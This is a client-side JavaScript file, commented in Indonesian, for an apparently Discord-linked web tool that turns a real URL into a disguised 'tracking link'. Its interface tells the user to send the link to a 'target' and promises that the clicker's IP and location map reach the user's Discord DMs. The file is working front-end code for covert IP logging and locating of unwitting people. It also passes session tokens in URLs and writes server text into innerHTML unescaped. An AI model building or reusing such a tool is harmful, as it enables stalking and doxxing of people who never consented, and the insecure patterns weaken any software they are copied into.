let currentSessionToken = "";

// Cek Param Query Sesi di URL saat halaman dimuat
window.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const session = urlParams.get('session');
  const username = urlParams.get('username');
  const avatar = urlParams.get('avatar');

  if (session && username && avatar) {
    currentSessionToken = session;
    localStorage.setItem('arex_session', session);
    localStorage.setItem('arex_username', decodeURIComponent(username));
    localStorage.setItem('arex_avatar', decodeURIComponent(avatar));
    
    // Bersihkan URL dari query string agar rapi
    window.history.replaceState({}, document.title, "/");
  } else {
    currentSessionToken = localStorage.getItem('arex_session') || "";
  }

  if (currentSessionToken) {
    // Ambil data tersimpan dari localStorage
    const savedUsername = localStorage.getItem('arex_username') || "Username";
    const savedAvatar = localStorage.getItem('arex_avatar') || "";

    // Pasang ke elemen HTML
    document.getElementById('userName').innerText = savedUsername;
    if (savedAvatar) {
      document.getElementById('userAvatar').src = savedAvatar;
    }

    // Tampilkan State Dashboard jika ada sesi
    document.getElementById('loginState').style.display = 'none';
    document.getElementById('appState').style.display = 'block';
  } else {
    document.getElementById('loginState').style.display = 'block';
    document.getElementById('appState').style.display = 'none';
  }
});

async function generateMaskedLink() {
  const target = document.getElementById('targetUrl').value.trim();
  const res = document.getElementById('resLogger');

  if (!currentSessionToken) {
    return alert('Silakan Login dengan Discord terlebih dahulu!');
  }
  if (!target) {
    return alert('Masukkan URL tujuan asli (misal: youtube.com)!');
  }

  res.innerHTML = "<span style='color:#94a3b8;'>Membuat link tracking...</span>";

  try {
    const response = await fetch(`/api/r/[id]?action=create&target=${encodeURIComponent(target)}&session=${currentSessionToken}`);
    const data = await response.json();

    if (data.status === 'success') {
      res.innerHTML = `
        <div style="color: #34d399; font-weight: bold; margin-bottom: 8px;">✅ LINK TRACKING SIAP</div>
        <div style="margin-bottom: 8px;">
          <p style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Kirim link ini ke target:</p>
          <input type="text" value="${data.shortUrl}" readonly style="width:100%; padding: 8px; background:#0f172a; border:1px solid #334155; color:#34d399; font-size:13px; border-radius:4px;" onclick="this.select()">
        </div>
        <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
          🔒 Begitu diklik, log IP & peta lokasi otomatis terkirim ke DM Discord kamu!
        </p>
      `;
    } else {
      res.innerHTML = `<span style='color:#ef4444;'>${data.error}</span>`;
    }
  } catch (err) {
    res.innerHTML = "<span style='color:#ef4444;'>Gagal membuat link tracking.</span>";
  }
}